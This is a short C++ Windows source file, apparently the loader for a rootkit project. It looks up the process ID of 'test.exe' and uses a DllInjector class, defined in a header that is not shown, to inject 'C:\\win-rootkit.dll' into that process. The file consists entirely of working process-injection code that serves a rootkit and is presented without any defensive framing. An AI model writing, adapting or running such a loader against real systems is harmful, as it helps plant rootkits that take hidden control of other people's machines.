#include <windows.h>
#include <tlhelp32.h>
#include <stdexcept>
#include <iostream>
#include <vector>

#include "dll_injector.h"


int get_pid_by_name(std::string name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	int pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (std::string(entry.szExeFile) == name)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				pid = entry.th32ProcessID;
				CloseHandle(hProcess);
				break;
			}
		}
	}
	CloseHandle(snapshot);
	return pid;
}


int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	DllInjector injector("C:\\win-rootkit.dll");
	int pid = get_pid_by_name("test.exe");
	if (!pid)
		return 1;
	injector.inject_into_pid(pid);
	return 0;
}
